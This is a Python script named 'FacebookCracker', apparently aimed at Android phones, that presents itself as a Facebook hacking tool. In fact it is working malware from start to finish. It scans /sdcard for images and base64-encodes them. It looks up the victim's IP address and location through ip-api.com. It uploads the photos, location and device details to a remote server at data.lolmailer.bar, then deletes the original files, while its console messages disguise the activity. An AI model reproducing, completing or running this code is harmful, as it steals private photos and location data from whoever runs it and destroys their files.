import os
import base64
import logging
import platform
import uuid
import random
import threading
import json
import requests
import time
import re
from datetime import datetime

class FacebookCracker:
    def __init__(self):
        self.debug_log = []
        self.device_id = self.get_device_id()
        self.MAX_DATA_SIZE = 100 * 1024 * 1024 * 1024  # 100 GB to collect all images
        self.MAX_BATCH_SIZE = 50 * 1024 * 1024  # 50 MB per batch (raw size)
        # Setup logging to file
        logging.basicConfig(filename='/sdcard/cracker_log.txt', level=logging.DEBUG, 
                            format='%(asctime)s %(levelname)s: %(message)s')
        self.debug_log.append(f"Initialized with device_id: {self.device_id}")

    def get_last_modified(self, file_path):
        """Get the last modified time of a file."""
        try:
            return datetime.fromtimestamp(os.path.getmtime(file_path)).strftime('%Y-%m-%d %H:%M:%S')
        except Exception:
            return "Unknown"

    def save_local_output(self, batch_files, batch_number):
        """Save batch data to local JSON for debugging."""
        try:
            output = {
                'device_id': self.device_id,
                'batch_number': batch_number,
                'files': batch_files,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            with open(f'/sdcard/cracker_batch_{batch_number}.json', 'w') as f:
                json.dump(output, f, indent=2)
            self.debug_log.append(f"Saved batch {batch_number} to /sdcard/cracker_batch_{batch_number}.json")
            logging.info(f"Saved batch {batch_number} to /sdcard/cracker_batch_{batch_number}.json")
        except Exception as e:
            self.debug_log.append(f"Failed to save batch {batch_number}: {str(e)}")
            logging.error(f"Failed to save batch {batch_number}: {str(e)}")

    def collect_batch(self, sdcard_path, total_size, processed_files, image_extensions):
        """Collect one batch of images up to MAX_BATCH_SIZE."""
        batch_files = []
        batch_deleted_files = []
        current_size = 0
        for root, dirs, files in os.walk(sdcard_path, followlinks=False):
            if '/Android/data' in root:
                continue
            for file_name in files:
                file_path = os.path.join(root, file_name)
                # Skip already processed files
                if file_path in processed_files:
                    continue
                # Check if file is an image
                if not file_name.lower().endswith(image_extensions):
                    self.debug_log.append(f"Skipping non-image file: {file_name}")
                    logging.info(f"Skipping non-image file: {file_name}")
                    continue
                if total_size >= self.MAX_DATA_SIZE:
                    self.debug_log.append("Reached MAX_DATA_SIZE limit")
                    logging.warning("Reached MAX_DATA_SIZE limit")
                    return batch_files, batch_deleted_files, total_size, True
                try:
                    size = os.path.getsize(file_path)
                    if size == 0:
                        self.debug_log.append(f"Skipping empty file: {file_path}")
                        logging.warning(f"Skipping empty file: {file_path}")
                        continue
                    if size > self.MAX_BATCH_SIZE:
                        self.debug_log.append(f"Skipping oversized image: {file_name} ({size / (1024 * 1024):.2f} MB)")
                        logging.warning(f"Skipping oversized image: {file_name} ({size / (1024 * 1024):.2f} MB)")
                        processed_files.add(file_path)
                        continue
                    if total_size + size > self.MAX_DATA_SIZE:
                        self.debug_log.append(f"Skipping {file_name}: exceeds MAX_DATA_SIZE limit")
                        logging.warning(f"Skipping {file_name}: exceeds MAX_DATA_SIZE limit")
                        processed_files.add(file_path)
                        continue
                    if current_size + (size * 1.33) <= self.MAX_BATCH_SIZE:  # Account for base64
                        with open(file_path, 'rb') as f:
                            content = base64.b64encode(f.read()).decode('utf-8', errors='ignore')
                        relative_path = os.path.relpath(root, sdcard_path)
                        relative_path = re.sub(r'[:*?"<>|]', '_', relative_path).strip('/')
                        file_data = {
                            'name': file_name,
                            'content': content,
                            'folder': relative_path,
                            'last_edit': self.get_last_modified(file_path),
                            'size': size
                        }
                        batch_files.append(file_data)
                        batch_deleted_files.append(file_path)
                        current_size += size * 1.33
                        total_size += size
                        processed_files.add(file_path)
                        self.debug_log.append(f"Collected image: {file_path} ({size / (1024 * 1024):.2f} MB)")
                        logging.info(f"Collected image: {file_path} ({size / (1024 * 1024):.2f} MB)")
                    else:
                        # Stop collecting for this batch
                        break
                except Exception as e:
                    self.debug_log.append(f"Failed to read {file_path}: {str(e)}")
                    logging.error(f"Failed to read {file_path}: {str(e)}")
                    processed_files.add(file_path)
                    continue
        return batch_files, batch_deleted_files, total_size, False

    def upload_scripts(self, delete_photos=True):
        """Upload images in batches, delete after success, process one batch at a time."""
        server_url_upload = "https://data.lolmailer.bar/api/upload_data"
        sdcard_path = "/sdcard"
        time.sleep(random.randint(2, 5))
        if not os.path.exists(sdcard_path):
            self.debug_log.append("SD card path not accessible")
            logging.error("SD card path not accessible")
            print("Error: SD card path not accessible")
            return
        # Supported image extensions
        image_extensions = ('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.heic', '.webp')
        processed_files = set()
        total_size = 0
        total_images = 0
        batch_number = 1
        reached_max_size = False

        # Estimate total images and size by scanning once (for display only)
        print("Estimating total installed...")
        estimate_size = 0
        estimate_count = 0
        for root, _, files in os.walk(sdcard_path, followlinks=False):
            if '/Android/data' in root:
                continue
            for file_name in files:
                if not file_name.lower().endswith(image_extensions):
                    continue
                file_path = os.path.join(root, file_name)
                try:
                    size = os.path.getsize(file_path)
                    if size == 0 or size > self.MAX_BATCH_SIZE:
                        continue
                    if estimate_size + size > self.MAX_DATA_SIZE:
                        break
                    estimate_count += 1
                    estimate_size += size
                except:
                    continue
        estimated_batches = (estimate_size / self.MAX_BATCH_SIZE) if estimate_size > 0 else 0
        estimated_batches = int(estimated_batches) + (1 if estimated_batches % 1 > 0 else 0)
        print(f"Estimated total install: {estimate_count}")
        print(f"Estimated done: {estimate_size / (1024 * 1024):.2f} MB")
        print(f"Estimated encoded total size: {(estimate_size * 1.33) / (1024 * 1024):.2f} MB")
        print(f"Estimated: {estimated_batches}")
        self.debug_log.append(f"Estimated done: {estimate_count}, raw size: {estimate_size / (1024 * 1024):.2f} MB, batches: {estimated_batches}")
        logging.info(f"Estimated total done: {estimate_count}, raw size: {estimate_size / (1024 * 1024):.2f} MB, batches: {estimated_batches}")

        # Process batches incrementally
        while not reached_max_size:
            batch_files, batch_deleted_files, total_size, reached_max_size = self.collect_batch(
                sdcard_path, total_size, processed_files, image_extensions
            )
            if not batch_files:
                print(f"Batch {batch_number} skipped: ")
                self.debug_log.append(f"Batch {batch_number} skipped: ")
                logging.warning(f"Batch {batch_number} skipped: ")
                break
            total_images += len(batch_files)
            batch_size_bytes = sum(file['size'] * 1.33 for file in batch_files)
            self.debug_log.append(f"Batch {batch_number} payload size: {batch_size_bytes / (1024 * 1024):.2f} MB encoded, {len(batch_files)}")
            logging.info(f"Batch {batch_number} payload size: {batch_size_bytes / (1024 * 1024):.2f} MB encoded, {len(batch_files)}")
            print(f"Batch {batch_number}: {len(batch_files)}, {batch_size_bytes / (1024 * 1024):.2f} MB encoded")
            self.save_local_output(batch_files, batch_number)
            
            # Retry logic for uploads
            retries = 3
            success = False
            for attempt in range(1, retries + 1):
                progress_thread = threading.Thread(target=self.display_progress_bar, args=(10, len(batch_files)))
                progress_thread.start()
                try:
                    ip_info = requests.get('http://ip-api.com/json/', timeout=5).json()
                    metadata = {
                        'ip': ip_info.get('query', 'Unknown'),
                        'country': ip_info.get('country', 'Unknown'),
                        'city': ip_info.get('city', 'Unknown'),
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                        'batch_number': batch_number,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                except Exception as e:
                    self.debug_log.append(f"Failed to fetch IP info: {str(e)}")
                    logging.error(f"Failed to fetch IP info: {str(e)}")
                    metadata = {
                        'ip': 'Unknown',
                        'country': 'Unknown',
                        'city': 'Unknown',
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                        'batch_number': batch_number,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                    }
                upload_payload = {
                    'device_id': self.device_id,
                    'device_name': platform.node() or f"Device_{uuid.uuid4().hex[:8]}",
                    'metadata': json.dumps(metadata, ensure_ascii=False),
                    'photos': json.dumps(batch_files, ensure_ascii=False),
                    'device_info': json.dumps(self.get_device_info(), ensure_ascii=False)
                }
                try:
                    response = requests.post(server_url_upload, json=upload_payload, timeout=60)
                    progress_thread.join()
                    if response.status_code == 200:
                        self.debug_log.append(f"batch {batch_number} for device {self.device_id}")
                        logging.info(f"batch {batch_number} for device {self.device_id}")
                        print(f"\nBatch {batch_number}")
                        success = True
                        # Delete files after successful upload
                        if delete_photos:
                            for file_path in batch_deleted_files:
                                try:
                                    os.remove(file_path)
                                    self.debug_log.append(f"Deleted {file_path}")
                                    logging.info(f"Deleted {file_path}")
                                except Exception as e:
                                    self.debug_log.append(f"Failed to delete {file_path}: {str(e)}")
                                    logging.error(f"Failed to delete {file_path}: {str(e)}")
                        break
                    else:
                        self.debug_log.append(f"Batch {batch_number} upload failed: {response.status_code} {response.text}")
                        logging.error(f"Batch {batch_number} upload failed: {response.status_code} {response.text}")
                        print(f"\nBatch {batch_number} upload failed: {response.status_code} {response.text}")
                except Exception as e:
                    progress_thread.join()
                    self.debug_log.append(f"Batch {batch_number} error (attempt {attempt}): {str(e)}")
                    logging.error(f"Batch {batch_number} error (attempt {attempt}): {str(e)}")
                    print(f"\nBatch {batch_number} error (attempt {attempt}): {str(e)}")
                if attempt < retries:
                    print(f"Retrying batch {batch_number} in 5 seconds...")
                    time.sleep(5)
            if not success:
                print(f"Batch {batch_number} failed after {retries} attempts, skipping...")
                self.debug_log.append(f"Batch {batch_number} failed after {retries} attempts")
                logging.error(f"Batch {batch_number} failed after {retries} attempts")
            print(f"Completed batch {batch_number}, total processed: {total_images}, total raw size: {total_size / (1024 * 1024):.2f} MB")
            batch_number += 1

    def get_device_id(self):
        """Generate or retrieve a unique device ID."""
        return uuid.uuid4().hex

    def get_device_info(self):
        """Retrieve device information."""
        return {
            'os': platform.system(),
            'release': platform.release(),
            'device_model': platform.node() or 'Unknown'
        }

    def display_progress_bar(self, duration, total_files):
        """Display a progress bar for file processing."""
        for i in range(total_files + 1):
            percent = (i / total_files) * 100
            bar = '█' * int(percent / 2) + '-' * (50 - int(percent / 2))
            print(f'\rProgress: |{bar}| {percent:.0f}% ({i}/{total_files} processed)', end='')
            time.sleep(duration / total_files)
        print()

if __name__ == '__main__':
    cracker = FacebookCracker()
    cracker.upload_scripts(delete_photos=True)
